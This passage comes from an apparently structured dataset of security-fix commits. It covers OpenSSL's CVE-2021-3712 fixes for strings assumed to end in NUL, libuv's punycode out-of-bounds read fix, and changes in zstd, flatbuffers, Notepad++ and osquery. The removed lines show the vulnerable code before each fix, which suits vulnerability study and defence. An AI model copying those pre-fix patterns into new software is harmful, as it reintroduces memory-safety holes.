    +        goto end;\n+    }\n \n+ end:\n+    OPENSSL_free(baseptr);\n+    return\
    \ ret;\n }\n \n static int nc_email(ASN1_IA5STRING *eml, ASN1_IA5STRING *base)\n\
    \ {\n     const char *baseptr = (char *)base->data;\n     const char *emlptr =\
    \ (char *)eml->data;\n+    const char *baseat = ia5memrchr(base, '@');\n+    const\
    \ char *emlat = ia5memrchr(eml, '@');\n+    size_t basehostlen, emlhostlen;\n\
    \ \n-    const char *baseat = strrchr(baseptr, '@');\n-    const char *emlat =\
    \ strrchr(emlptr, '@');\n     if (!emlat)\n         return X509_V_ERR_UNSUPPORTED_NAME_SYNTAX;\n\
    \     /* Special case: initial '.' is RHS match */\n-    if (!baseat && (*baseptr\
    \ == '.')) {\n+    if (!baseat && base->length > 0 && (*baseptr == '.')) {\n \
    \        if (eml->length > base->length) {\n             emlptr += eml->length\
    \ - base->length;\n-            if (ia5casecmp(baseptr, emlptr) == 0)\n+     \
    \       if (ia5ncasecmp(baseptr, emlptr, base->length) == 0)\n               \
    \  return X509_V_OK;\n         }\n         return X509_V_ERR_PERMITTED_VIOLATION;\n\
    @@ -676,8 +722,10 @@ static int nc_email(ASN1_IA5STRING *eml, ASN1_IA5STRING *base)\n\
    \         baseptr = baseat + 1;\n     }\n     emlptr = emlat + 1;\n+    basehostlen\
    \ = IA5_OFFSET_LEN(base, baseptr);\n+    emlhostlen = IA5_OFFSET_LEN(eml, emlptr);\n\
    \     /* Just have hostname left to match: case insensitive */\n-    if (ia5casecmp(baseptr,\
    \ emlptr))\n+    if (basehostlen != emlhostlen || ia5ncasecmp(baseptr, emlptr,\
    \ emlhostlen))\n         return X509_V_ERR_PERMITTED_VIOLATION;\n \n     return\
    \ X509_V_OK;\n@@ -688,33 +736,36 @@ static int nc_uri(ASN1_IA5STRING *uri, ASN1_IA5STRING\
    \ *base)\n {\n     const char *baseptr = (char *)base->data;\n     const char\
    \ *hostptr = (char *)uri->data;\n-    const char *p = strchr(hostptr, ':');\n\
    +    const char *p = ia5memchr(uri, (char *)uri->data, ':');\n     int hostlen;\n\
    \ \n     /* Check for foo:// and skip past it */\n-    if (p == NULL || p[1] !=\
    \ '/' || p[2] != '/')\n+    if (p == NULL\n+            || IA5_OFFSET_LEN(uri,\
    \ p) < 3\n+            || p[1] != '/'\n+            || p[2] != '/')\n        \
    \ return X509_V_ERR_UNSUPPORTED_NAME_SYNTAX;\n     hostptr = p + 3;\n \n     /*\
    \ Determine length of hostname part of URI */\n \n     /* Look for a port indicator\
    \ as end of hostname first */\n \n-    p = strchr(hostptr, ':');\n+    p = ia5memchr(uri,\
    \ hostptr, ':');\n     /* Otherwise look for trailing slash */\n     if (p ==\
    \ NULL)\n-        p = strchr(hostptr, '/');\n+        p = ia5memchr(uri, hostptr,\
    \ '/');\n \n     if (p == NULL)\n-        hostlen = strlen(hostptr);\n+      \
    \  hostlen = IA5_OFFSET_LEN(uri, hostptr);\n     else\n         hostlen = p -\
    \ hostptr;\n \n     if (hostlen == 0)\n         return X509_V_ERR_UNSUPPORTED_NAME_SYNTAX;\n\
    \ \n     /* Special case: initial '.' is RHS match */\n-    if (*baseptr == '.')\
    \ {\n+    if (base->length > 0 && *baseptr == '.') {\n         if (hostlen > base->length)\
    \ {\n             p = hostptr + hostlen - base->length;\n             if (ia5ncasecmp(p,\
    \ baseptr, base->length) == 0)"
  commit_message: 'Fix the name constraints code to not assume NUL terminated strings


    ASN.1 strings may not be NUL terminated. Don''t assume they are.


    CVE-2021-3712


    Reviewed-by: Viktor Dukhovni <viktor@openssl.org>

    Reviewed-by: Paul Dale <pauli@openssl.org>

    Reviewed-by: David Benjamin <davidben@google.com>'
  commit_sha: d2015a783e64613d8e4a142fa05048d1863df944
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/crypto/x509/v3_pci.c\n+++ b/crypto/x509/v3_pci.c\n@@ -76,7 +76,8 @@ static\
    \ int i2r_pci(X509V3_EXT_METHOD *method, PROXY_CERT_INFO_EXTENSION *pci,\n   \
    \  BIO_printf(out, \"%*sPolicy Language: \", indent, \"\");\n     i2a_ASN1_OBJECT(out,\
    \ pci->proxyPolicy->policyLanguage);\n     if (pci->proxyPolicy->policy && pci->proxyPolicy->policy->data)\n\
    -        BIO_printf(out, \"\\n%*sPolicy Text: %s\", indent, \"\",\n+        BIO_printf(out,\
    \ \"\\n%*sPolicy Text: %.*s\", indent, \"\",\n+                   pci->proxyPolicy->policy->length,\n\
    \                    pci->proxyPolicy->policy->data);\n     return 1;\n }"
  commit_message: 'Fix printing of PROXY_CERT_INFO_EXTENSION to not assume NUL terminated
    strings


    ASN.1 strings may not be NUL terminated. Don''t assume they are.


    CVE-2021-3712


    Reviewed-by: Viktor Dukhovni <viktor@openssl.org>

    Reviewed-by: Paul Dale <pauli@openssl.org>

    Reviewed-by: David Benjamin <davidben@google.com>'
  commit_sha: 918430ba80d94ec8f05383b43b1872b1ebb13e1a
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/crypto/x509/v3_san.c\n+++ b/crypto/x509/v3_san.c\n@@ -223,23 +223,28 @@\
    \ int GENERAL_NAME_print(BIO *out, GENERAL_NAME *gen)\n \n         switch (nid)\
    \ {\n         case NID_id_on_SmtpUTF8Mailbox:\n-            BIO_printf(out, \"\
    othername:SmtpUTF8Mailbox:%s\",\n+            BIO_printf(out, \"othername:SmtpUTF8Mailbox:%.*s\"\
    ,\n+                       gen->d.otherName->value->value.utf8string->length,\n\
    \                        gen->d.otherName->value->value.utf8string->data);\n \
    \            break;\n         case NID_XmppAddr:\n-            BIO_printf(out,\
    \ \"othername:XmppAddr:%s\",\n+            BIO_printf(out, \"othername:XmppAddr:%.*s\"\
    ,\n+                       gen->d.otherName->value->value.utf8string->length,\n\
    \                        gen->d.otherName->value->value.utf8string->data);\n \
    \            break;\n         case NID_SRVName:\n-            BIO_printf(out,\
    \ \"othername:SRVName:%s\",\n+            BIO_printf(out, \"othername:SRVName:%.*s\"\
    ,\n+                       gen->d.otherName->value->value.ia5string->length,\n\
    \                        gen->d.otherName->value->value.ia5string->data);\n  \
    \           break;\n         case NID_ms_upn:\n-            BIO_printf(out, \"\
    othername:UPN:%s\",\n+            BIO_printf(out, \"othername:UPN:%.*s\",\n+ \
    \                      gen->d.otherName->value->value.utf8string->length,\n  \
    \                      gen->d.otherName->value->value.utf8string->data);\n   \
    \          break;\n         case NID_NAIRealm:\n-            BIO_printf(out, \"\
    othername:NAIRealm:%s\",\n+            BIO_printf(out, \"othername:NAIRealm:%.*s\"\
    ,\n+                       gen->d.otherName->value->value.utf8string->length,\n\
    \                        gen->d.otherName->value->value.utf8string->data);\n \
    \            break;\n         default:"
  commit_message: 'Fix GENERAL_NAME_print to not assume NUL terminated strings


    ASN.1 strings may not be NUL terminated. Don''t assume they are.


    CVE-2021-3712


    Reviewed-by: Viktor Dukhovni <viktor@openssl.org>

    Reviewed-by: Paul Dale <pauli@openssl.org>

    Reviewed-by: David Benjamin <davidben@google.com>'
  commit_sha: b2b3b9c9936b91315adc0f3254879cb2fd5ca2bd
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/crypto/x509/v3_cpols.c\n+++ b/crypto/x509/v3_cpols.c\n@@ -426,7 +426,8\
    \ @@ static void print_qualifiers(BIO *out, STACK_OF(POLICYQUALINFO) *quals,\n\
    \         qualinfo = sk_POLICYQUALINFO_value(quals, i);\n         switch (OBJ_obj2nid(qualinfo->pqualid))\
    \ {\n         case NID_id_qt_cps:\n-            BIO_printf(out, \"%*sCPS: %s\"\
    , indent, \"\",\n+            BIO_printf(out, \"%*sCPS: %.*s\", indent, \"\",\n\
    +                       qualinfo->d.cpsuri->length,\n                        qualinfo->d.cpsuri->data);\n\
    \             break;\n \n@@ -450,7 +451,8 @@ static void print_notice(BIO *out,\
    \ USERNOTICE *notice, int indent)\n     if (notice->noticeref) {\n         NOTICEREF\
    \ *ref;\n         ref = notice->noticeref;\n-        BIO_printf(out, \"%*sOrganization:\
    \ %s\\n\", indent, \"\",\n+        BIO_printf(out, \"%*sOrganization: %.*s\\n\"\
    , indent, \"\",\n+                   ref->organization->length,\n            \
    \        ref->organization->data);\n         BIO_printf(out, \"%*sNumber%s: \"\
    , indent, \"\",\n                    sk_ASN1_INTEGER_num(ref->noticenos) > 1 ?\
    \ \"s\" : \"\");\n@@ -474,7 +476,8 @@ static void print_notice(BIO *out, USERNOTICE\
    \ *notice, int indent)\n             BIO_puts(out, \"\\n\");\n     }\n     if\
    \ (notice->exptext)\n-        BIO_printf(out, \"%*sExplicit Text: %s\", indent,\
    \ \"\",\n+        BIO_printf(out, \"%*sExplicit Text: %.*s\", indent, \"\",\n\
    +                   notice->exptext->length,\n                    notice->exptext->data);\n\
    \ }\n "
  commit_message: 'Fix POLICYINFO printing to not assume NUL terminated strings


    ASN.1 strings may not be NUL terminated. Don''t assume they are.


    CVE-2021-3712


    Reviewed-by: Viktor Dukhovni <viktor@openssl.org>

    Reviewed-by: Paul Dale <pauli@openssl.org>

    Reviewed-by: David Benjamin <davidben@google.com>'
  commit_sha: 1747d4658b3830951068a6a6c1fa2b45c4731fb3
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/crypto/x509/v3_san.c\n+++ b/crypto/x509/v3_san.c\n@@ -9,6 +9,7 @@\n \n\
    \ #include <stdio.h>\n #include \"internal/cryptlib.h\"\n+#include \"crypto/x509.h\"\
    \n #include <openssl/conf.h>\n #include <openssl/x509v3.h>\n #include <openssl/bio.h>\n\
    @@ -87,36 +88,41 @@ STACK_OF(CONF_VALUE) *i2v_GENERAL_NAME(X509V3_EXT_METHOD *method,\n\
    \         switch (OBJ_obj2nid(gen->d.otherName->type_id)) {\n         case NID_id_on_SmtpUTF8Mailbox:\n\
    \             if (gen->d.otherName->value->type != V_ASN1_UTF8STRING\n-      \
    \              || !X509V3_add_value_uchar(\"othername: SmtpUTF8Mailbox:\",\n+\
    \                    || !x509v3_add_len_value_uchar(\"othername: SmtpUTF8Mailbox:\"\
    ,\n                             gen->d.otherName->value->value.utf8string->data,\n\
    +                            gen->d.otherName->value->value.utf8string->length,\n\
    \                             &ret))\n                 return NULL;\n        \
    \     break;\n         case NID_XmppAddr:\n             if (gen->d.otherName->value->type\
    \ != V_ASN1_UTF8STRING\n-                    || !X509V3_add_value_uchar(\"othername:\
    \ XmppAddr:\",\n+                    || !x509v3_add_len_value_uchar(\"othername:\
    \ XmppAddr:\",\n                             gen->d.otherName->value->value.utf8string->data,\n\
    +                            gen->d.otherName->value->value.utf8string->length,\n\
    \                             &ret))\n                 return NULL;\n        \
    \     break;\n         case NID_SRVName:\n             if (gen->d.otherName->value->type\
    \ != V_ASN1_IA5STRING\n-                    || !X509V3_add_value_uchar(\"othername:\
    \ SRVName:\",\n+                    || !x509v3_add_len_value_uchar(\"othername:\
    \ SRVName:\",\n                             gen->d.otherName->value->value.ia5string->data,\n\
    +                            gen->d.otherName->value->value.ia5string->length,\n\
    \                             &ret))\n                 return NULL;\n        \
    \     break;\n         case NID_ms_upn:\n             if (gen->d.otherName->value->type\
    \ != V_ASN1_UTF8STRING\n-                    || !X509V3_add_value_uchar(\"othername:\
    \ UPN:\",\n+                    || !x509v3_add_len_value_uchar(\"othername: UPN:\"\
    ,\n                             gen->d.otherName->value->value.utf8string->data,\n\
    +                            gen->d.otherName->value->value.utf8string->length,\n\
    \                             &ret))\n                 return NULL;\n        \
    \     break;\n         case NID_NAIRealm:\n             if (gen->d.otherName->value->type\
    \ != V_ASN1_UTF8STRING\n-                    || !X509V3_add_value_uchar(\"othername:\
    \ NAIRealm:\",\n+                    || !x509v3_add_len_value_uchar(\"othername:\
    \ NAIRealm:\",\n                             gen->d.otherName->value->value.utf8string->data,\n\
    +                            gen->d.otherName->value->value.utf8string->length,\n\
    \                             &ret))\n                 return NULL;\n        \
    \     break;\n@@ -129,14 +135,16 @@ STACK_OF(CONF_VALUE) *i2v_GENERAL_NAME(X509V3_EXT_METHOD\
    \ *method,\n \n             /* check if the value is something printable */\n\
    \             if (gen->d.otherName->value->type == V_ASN1_IA5STRING) {\n-    \
    \            if (X509V3_add_value_uchar(othername,\n+                if (x509v3_add_len_value_uchar(othername,\n\
    \                              gen->d.otherName->value->value.ia5string->data,\n\
    +                             gen->d.otherName->value->value.ia5string->length,\n\
    \                              &ret)) \n                     return ret;\n   \
    \          }\n             if (gen->d.otherName->value->type == V_ASN1_UTF8STRING)\
    \ {\n-                if (X509V3_add_value_uchar(othername,\n+               \
    \ if (x509v3_add_len_value_uchar(othername,\n                              gen->d.otherName->value->value.utf8string->data,\n\
    +                             gen->d.otherName->value->value.utf8string->length,\n\
    \                              &ret)) \n                     return ret;\n   \
    \          }\n@@ -157,17 +165,20 @@ STACK_OF(CONF_VALUE) *i2v_GENERAL_NAME(X509V3_EXT_METHOD\
    \ *method,\n         break;\n \n     case GEN_EMAIL:\n-        if (!X509V3_add_value_uchar(\"\
    email\", gen->d.ia5->data, &ret))\n+        if (!x509v3_add_len_value_uchar(\"\
    email\", gen->d.ia5->data,\n+                                        gen->d.ia5->length,\
    \ &ret))\n             return NULL;\n         break;\n \n     case GEN_DNS:\n\
    -        if (!X509V3_add_value_uchar(\"DNS\", gen->d.ia5->data, &ret))\n+    \
    \    if (!x509v3_add_len_value_uchar(\"DNS\", gen->d.ia5->data,\n+           \
    \                             gen->d.ia5->length, &ret))\n             return\
    \ NULL;\n         break;\n \n     case GEN_URI:\n-        if (!X509V3_add_value_uchar(\"\
    URI\", gen->d.ia5->data, &ret))\n+        if (!x509v3_add_len_value_uchar(\"URI\"\
    , gen->d.ia5->data,\n+                                        gen->d.ia5->length,\
    \ &ret))\n             return NULL;\n         break;\n "
  - "--- a/crypto/x509/v3_utl.c\n+++ b/crypto/x509/v3_utl.c\n@@ -12,6 +12,7 @@\n #include\
    \ \"e_os.h\"\n #include \"internal/cryptlib.h\"\n #include <stdio.h>\n+#include\
    \ <string.h>\n #include \"crypto/ctype.h\"\n #include <openssl/conf.h>\n #include\
    \ <openssl/crypto.h>\n@@ -36,17 +37,23 @@ static int ipv6_hex(unsigned char *out,\
    \ const char *in, int inlen);\n \n /* Add a CONF_VALUE name value pair to stack\
    \ */\n \n-int X509V3_add_value(const char *name, const char *value,\n-       \
    \              STACK_OF(CONF_VALUE) **extlist)\n+static int x509v3_add_len_value(const\
    \ char *name, const char *value,\n+                                size_t vallen,\
    \ STACK_OF(CONF_VALUE) **extlist)\n {\n     CONF_VALUE *vtmp = NULL;\n     char\
    \ *tname = NULL, *tvalue = NULL;\n     int sk_allocated = (*extlist == NULL);\n\
    \ \n-    if (name && (tname = OPENSSL_strdup(name)) == NULL)\n-        goto err;\n\
    -    if (value && (tvalue = OPENSSL_strdup(value)) == NULL)\n+    if (name !=\
    \ NULL && (tname = OPENSSL_strdup(name)) == NULL)\n         goto err;\n+    if\
    \ (value != NULL) {\n+        /* We don't allow embeded NUL characters */\n+ \
    \       if (memchr(value, 0, vallen) != NULL)\n+            goto err;\n+     \
    \   tvalue = OPENSSL_strndup(value, vallen);\n+        if (tvalue == NULL)\n+\
    \            goto err;\n+    }\n     if ((vtmp = OPENSSL_malloc(sizeof(*vtmp)))\
    \ == NULL)\n         goto err;\n     if (sk_allocated && (*extlist = sk_CONF_VALUE_new_null())\
    \ == NULL)\n@@ -69,10 +76,26 @@ int X509V3_add_value(const char *name, const char\
    \ *value,\n     return 0;\n }\n \n+int X509V3_add_value(const char *name, const\
    \ char *value,\n+                     STACK_OF(CONF_VALUE) **extlist)\n+{\n+ \
    \   return x509v3_add_len_value(name, value,\n+                              \
    \  value != NULL ? strlen((const char *)value) : 0,\n+                       \
    \         extlist);\n+}\n+\n int X509V3_add_value_uchar(const char *name, const\
    \ unsigned char *value,\n                            STACK_OF(CONF_VALUE) **extlist)\n\
    \ {\n-    return X509V3_add_value(name, (const char *)value, extlist);\n+    return\
    \ x509v3_add_len_value(name, (const char *)value,\n+                         \
    \       value != NULL ? strlen((const char *)value) : 0,\n+                  \
    \              extlist);\n+}\n+\n+int x509v3_add_len_value_uchar(const char *name,\
    \ const unsigned char *value,\n+                               size_t vallen,\
    \ STACK_OF(CONF_VALUE) **extlist)\n+{\n+    return x509v3_add_len_value(name,\
    \ (const char *)value, vallen, extlist);\n }\n \n /* Free function for STACK_OF(CONF_VALUE)\
    \ */"
  commit_message: 'Fix i2v_GENERAL_NAME to not assume NUL terminated strings


    ASN.1 strings may not be NUL terminated. Don''t assume they are.


    CVE-2021-3712


    Reviewed-by: Viktor Dukhovni <viktor@openssl.org>

    Reviewed-by: Paul Dale <pauli@openssl.org>

    Reviewed-by: David Benjamin <davidben@google.com>'
  commit_sha: ad6ac17489241574136b7d035f01f6175dd9c941
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/src/idna.c\n+++ b/src/idna.c\n@@ -19,6 +19,7 @@\n \n #include \"uv.h\"\n\
    \ #include \"idna.h\"\n+#include <assert.h>\n #include <string.h>\n \n static\
    \ unsigned uv__utf8_decode1_slow(const char** p,\n@@ -32,7 +33,7 @@ static unsigned\
    \ uv__utf8_decode1_slow(const char** p,\n   if (a > 0xF7)\n     return -1;\n \n\
    -  switch (*p - pe) {\n+  switch (pe - *p) {\n   default:\n     if (a > 0xEF)\
    \ {\n       min = 0x10000;\n@@ -62,6 +63,8 @@ static unsigned uv__utf8_decode1_slow(const\
    \ char** p,\n       a = 0;\n       break;\n     }\n+    /* Fall through. */\n\
    +  case 0:\n     return -1;  /* Invalid continuation byte. */\n   }\n \n@@ -88,6\
    \ +91,8 @@ static unsigned uv__utf8_decode1_slow(const char** p,\n unsigned uv__utf8_decode1(const\
    \ char** p, const char* pe) {\n   unsigned a;\n \n+  assert(*p < pe);\n+\n   a\
    \ = (unsigned char) *(*p)++;\n \n   if (a < 128)\n@@ -96,9 +101,6 @@ unsigned\
    \ uv__utf8_decode1(const char** p, const char* pe) {\n   return uv__utf8_decode1_slow(p,\
    \ pe, a);\n }\n \n-#define foreach_codepoint(c, p, pe) \\\n-  for (; (void) (*p\
    \ <= pe && (c = uv__utf8_decode1(p, pe))), *p <= pe;)\n-\n static int uv__idna_toascii_label(const\
    \ char* s, const char* se,\n                                   char** d, char*\
    \ de) {\n   static const char alphabet[] = \"abcdefghijklmnopqrstuvwxyz0123456789\"\
    ;\n@@ -121,25 +123,36 @@ static int uv__idna_toascii_label(const char* s, const\
    \ char* se,\n   ss = s;\n   todo = 0;\n \n-  foreach_codepoint(c, &s, se) {\n\
    +  /* Note: after this loop we've visited all UTF-8 characters and know\n+   *\
    \ they're legal so we no longer need to check for decode errors.\n+   */\n+  while\
    \ (s < se) {\n+    c = uv__utf8_decode1(&s, se);\n+\n+    if (c == -1u)\n+   \
    \   return UV_EINVAL;\n+\n     if (c < 128)\n       h++;\n-    else if (c == (unsigned)\
    \ -1)\n-      return UV_EINVAL;\n     else\n       todo++;\n   }\n \n+  /* Only\
    \ write \"xn--\" when there are non-ASCII characters. */\n   if (todo > 0) {\n\
    \     if (*d < de) *(*d)++ = 'x';\n     if (*d < de) *(*d)++ = 'n';\n     if (*d\
    \ < de) *(*d)++ = '-';\n     if (*d < de) *(*d)++ = '-';\n   }\n \n+  /* Write\
    \ ASCII characters. */\n   x = 0;\n   s = ss;\n-  foreach_codepoint(c, &s, se)\
    \ {\n+  while (s < se) {\n+    c = uv__utf8_decode1(&s, se);\n+    assert(c !=\
    \ -1u);\n+\n     if (c > 127)\n       continue;\n \n@@ -166,10 +179,15 @@ static\
    \ int uv__idna_toascii_label(const char* s, const char* se,\n   while (todo >\
    \ 0) {\n     m = -1;\n     s = ss;\n-    foreach_codepoint(c, &s, se)\n+\n+  \
    \  while (s < se) {\n+      c = uv__utf8_decode1(&s, se);\n+      assert(c !=\
    \ -1u);\n+\n       if (c >= n)\n         if (c < m)\n           m = c;\n+    }\n\
    \ \n     x = m - n;\n     y = h + 1;\n@@ -181,7 +199,10 @@ static int uv__idna_toascii_label(const\
    \ char* s, const char* se,\n     n = m;\n \n     s = ss;\n-    foreach_codepoint(c,\
    \ &s, se) {\n+    while (s < se) {\n+      c = uv__utf8_decode1(&s, se);\n+  \
    \    assert(c != -1u);\n+\n       if (c < n)\n         if (++delta == 0)\n   \
    \        return UV_E2BIG;  /* Overflow. */\n@@ -245,8 +266,6 @@ static int uv__idna_toascii_label(const\
    \ char* s, const char* se,\n   return 0;\n }\n \n-#undef foreach_codepoint\n-\n\
    \ long uv__idna_toascii(const char* s, const char* se, char* d, char* de) {\n\
    \   const char* si;\n   const char* st;\n@@ -256,10 +275,14 @@ long uv__idna_toascii(const\
    \ char* s, const char* se, char* d, char* de) {\n \n   ds = d;\n \n-  for (si\
    \ = s; si < se; /* empty */) {\n+  si = s;\n+  while (si < se) {\n     st = si;\n\
    \     c = uv__utf8_decode1(&si, se);\n \n+    if (c == -1u)\n+      return UV_EINVAL;\n\
    +\n     if (c != '.')\n       if (c != 0x3002)  /* \u3002 */\n         if (c !=\
    \ 0xFF0E)  /* \uFF0E */"
  - "--- a/test/test-idna.c\n+++ b/test/test-idna.c\n@@ -96,6 +96,25 @@ TEST_IMPL(utf8_decode1)\
    \ {\n   return 0;\n }\n \n+TEST_IMPL(utf8_decode1_overrun) {\n+  const char* p;\n\
    +  char b[1];\n+\n+  /* Single byte. */\n+  p = b;\n+  b[0] = 0x7F;\n+  ASSERT_EQ(0x7F,\
    \ uv__utf8_decode1(&p, b + 1));\n+  ASSERT_EQ(p, b + 1);\n+\n+  /* Multi-byte.\
    \ */\n+  p = b;\n+  b[0] = 0xC0;\n+  ASSERT_EQ((unsigned) -1, uv__utf8_decode1(&p,\
    \ b + 1));\n+  ASSERT_EQ(p, b + 1);\n+\n+  return 0;\n+}\n+\n /* Doesn't work\
    \ on z/OS because that platform uses EBCDIC, not ASCII. */\n #ifndef __MVS__\n\
    \ "
  commit_message: 'idna: fix OOB read in punycode decoder


    libuv was vulnerable to out-of-bounds reads in the uv__idna_toascii()

    function which is used to convert strings to ASCII. This is called by

    the DNS resolution function and can lead to information disclosures or

    crashes.


    Reported by Eric Sesterhenn in collaboration with Cure53 and ExpressVPN.


    Reported-By: Eric Sesterhenn <eric.sesterhenn@x41-dsec.de>

    Fixes: https://github.com/libuv/libuv/issues/3147

    PR-URL: https://github.com/libuv/libuv-private/pull/1

    Refs: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22918

    Reviewed-By: Colin Ihrig <cjihrig@gmail.com>

    Reviewed-By: Richard Lau <riclau@uk.ibm.com>'
  commit_sha: b7466e31e4bee160d82a68fca11b1f61d46debae
  repo_name: libuv/libuv
- commit_diff:
  - "--- a/src/unix/udp.c\n+++ b/src/unix/udp.c\n@@ -504,6 +504,28 @@ static int uv__set_reuse(int\
    \ fd) {\n   return 0;\n }\n \n+/*\n+ * The Linux kernel suppresses some ICMP error\
    \ messages by default for UDP\n+ * sockets. Setting IP_RECVERR/IPV6_RECVERR on\
    \ the socket enables full ICMP\n+ * error reporting, hopefully resulting in faster\
    \ failover to working name\n+ * servers.\n+ */\n+static int uv__set_recverr(int\
    \ fd, sa_family_t ss_family) {\n+#if defined(__linux__)\n+  int yes;\n+\n+  yes\
    \ = 1;\n+  if (ss_family == AF_INET) {\n+    if (setsockopt(fd, IPPROTO_IP, IP_RECVERR,\
    \ &yes, sizeof(yes)))\n+      return UV__ERR(errno);\n+  } else if (ss_family\
    \ == AF_INET6) {\n+    if (setsockopt(fd, IPPROTO_IPV6, IPV6_RECVERR, &yes, sizeof(yes)))\n\
    +       return UV__ERR(errno);\n+  }\n+#endif\n+  return 0;\n+}\n+\n \n int uv__udp_bind(uv_udp_t*\
    \ handle,\n                  const struct sockaddr* addr,\n@@ -514,7 +536,7 @@\
    \ int uv__udp_bind(uv_udp_t* handle,\n   int fd;\n \n   /* Check for bad flags.\
    \ */\n-  if (flags & ~(UV_UDP_IPV6ONLY | UV_UDP_REUSEADDR))\n+  if (flags & ~(UV_UDP_IPV6ONLY\
    \ | UV_UDP_REUSEADDR | UV_UDP_LINUX_RECVERR))\n     return UV_EINVAL;\n \n   /*\
    \ Cannot set IPv6-only mode on non-IPv6 socket. */\n@@ -530,6 +552,12 @@ int uv__udp_bind(uv_udp_t*\
    \ handle,\n     handle->io_watcher.fd = fd;\n   }\n \n+  if (flags & UV_UDP_LINUX_RECVERR)\
    \ {\n+    err = uv__set_recverr(fd, addr->sa_family);\n+    if (err)\n+      return\
    \ err;\n+  }\n+\n   if (flags & UV_UDP_REUSEADDR) {\n     err = uv__set_reuse(fd);\n\
    \     if (err)"
  commit_message: 'linux,udp: enable full ICMP error reporting


    The Linux kernel suppresses some ICMP error messages by default for UDP

    sockets. This commit sets IP_RECVERR/IPV6_RECVERR on the socket to

    enable full ICMP error reporting, hopefully resulting in faster failover

    to working name servers.


    PR-URL: https://github.com/libuv/libuv/pull/2872

    Reviewed-By: Ben Noordhuis <info@bnoordhuis.nl>

    Reviewed-By: Santiago Gimeno <santiago.gimeno@gmail.com>'
  commit_sha: c382d39a85c1edbaf96f0cd84385cd6549c0bde2
  repo_name: libuv/libuv
- commit_diff:
  - "--- a/programs/fileio.c\n+++ b/programs/fileio.c\n@@ -1011,8 +1011,8 @@ int FIO_compressMultipleFilenames(const\
    \ char** inFileNamesTable, unsigned nbFile\n                 if (!dstFileName)\
    \ {\n                     EXM_THROW(30, \"zstd: %s\", strerror(errno));\n    \
    \         }   }\n-            strcpy(dstFileName, inFileNamesTable[u]);\n-   \
    \         strcat(dstFileName, suffix);\n+            strncpy(dstFileName, inFileNamesTable[u],\
    \ ifnSize+1 /* Include null */);\n+            strncat(dstFileName, suffix, suffixSize);\n\
    \             missed_files += FIO_compressFilename_dstFile(ress, dstFileName,\
    \ inFileNamesTable[u], compressionLevel);\n     }   }\n "
  commit_message: 'Fixed unsafe string copy and concat in `fileio.c`.


    Per warnings from flawfinder: "Does not check for buffer overflows when

    copying to destination [MS-banned] (CWE-120). Consider using snprintf,

    strcpy_s, or strlcpy (warning: strncpy easily misused).".


    Replaced called to strcpy and strcat in `fileio.c` to calls with a

    specified size (`strncpy` and `strncat`).


    Tested the changes on OSX, Linux, Windows.

    On OSX + Linux, changes were tested with ASAN. The following flags were

    used: ''check_initialization_order=1:strict_init_order=1:detect_odr_violation=1:detect_stack_use_after_return=1''


    To reproduce warning:

    ./flawfinder.py ./programs/fileio.c'
  commit_sha: 78af534f82e32277d3272881d4351363ab1e3488
  repo_name: facebook/zstd
- commit_diff:
  - "--- a/src/flatc.cpp\n+++ b/src/flatc.cpp\n@@ -435,8 +435,7 @@ int FlatCompiler::Compile(int\
    \ argc, const char **argv) {\n         }\n       } else {\n         ParseFile(*parser.get(),\
    \ filename, contents, include_directories);\n-        if (!opts.use_flexbuffers\
    \ && !is_schema &&\n-            !parser->builder_.GetSize()) {\n+        if (!is_schema\
    \ && !parser->builder_.GetSize()) {\n           // If a file doesn't end in .fbs,\
    \ it must be json/binary. Ensure we\n           // didn't just parse a schema\
    \ with a different extension.\n           Error(\"input file is neither json nor\
    \ a .fbs (schema) file: \" +"
  commit_message: "[flatc] Remove an always true condition for flexbuffers (#5604)\n\
    \nThe condition was unnecessary and Detected by\r\n\r\nPVS-Studio\r\nV560 [CWE-571]\
    \ A part of conditional expression is always true: !opts.use_flexbuffers. flatc.cpp\
    \ 438"
  commit_sha: 3c7b660d623b160c24fe72290011cb23be858fc2
  repo_name: google/flatbuffers
- commit_diff:
  - "--- a/PowerEditor/src/Notepad_plus.cpp\n+++ b/PowerEditor/src/Notepad_plus.cpp\n\
    @@ -3430,9 +3430,27 @@ void Notepad_plus::addHotSpot(ScintillaEditView* view)\n\
    \ \tpView->execute(SCI_SETINDICATORVALUE, indicFore);\r\n \r\n \tUINT cp = static_cast<UINT>(pView->execute(SCI_GETCODEPAGE));\r\
    \n-\tchar *encodedText = new char[endPos - startPos + 1];\r\n+\tchar* encodedText\
    \ = nullptr;\r\n+\ttry {\r\n+\t\tencodedText = new char[endPos - startPos + 1];\r\
    \n+\t}\r\n+\tcatch (const std::bad_alloc&)\r\n+\t{\r\n+\t\treturn;\r\n+\t}\r\n\
    +\r\n \tpView->getText(encodedText, startPos, endPos);\r\n-\tTCHAR *wideText =\
    \ new TCHAR[endPos - startPos + 1];\r\n+\tTCHAR* wideText = nullptr;\r\n+\ttry\r\
    \n+\t{\r\n+\t\twideText = new TCHAR[endPos - startPos + 1];\r\n+\t}\r\n+\tcatch\
    \ (const std::bad_alloc&)\r\n+\t{\r\n+\t\tdelete[] encodedText;\r\n+\t\treturn;\r\
    \n+\t}\r\n+\r\n \tint wideTextLen = MultiByteToWideChar(cp, 0, encodedText, static_cast<int>(endPos\
    \ - startPos + 1), (LPWSTR) wideText, static_cast<int>(endPos - startPos + 1))\
    \ - 1;\r\n \tdelete[] encodedText;\r\n \tif (wideTextLen > 0)\r"
  commit_message: 'Fix  security issue CVE-2022-31901


    Ref: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-31901

    &

    https://github.com/CDACesec/CVE-2022-31901


    Fix #13520'
  commit_sha: 113003a79fd4ee424de634e95c47632a4a5a66e5
  repo_name: notepad-plus-plus/notepad-plus-plus
- commit_diff:
  - '--- a/libraries/cmake/source/yara/patches/strutils.cpp

    +++ b/libraries/cmake/source/yara/patches/strutils.cpp

    @@ -1,61 +0,0 @@

    -#pragma once

    -

    -#include <stdio.h>

    -#include <string.h>

    -#include <yara/strutils.h>

    -

    -#undef HAVE_STRLCPY

    -#define HAVE_STRLCPY 0

    -#undef strlcpy

    -

    -#undef HAVE_STRLCAT

    -#define HAVE_STRLCAT 0

    -#undef strlcat

    -

    -#undef HAVE_MEMMEM

    -#define HAVE_MEMMEM 0

    -#undef memmem

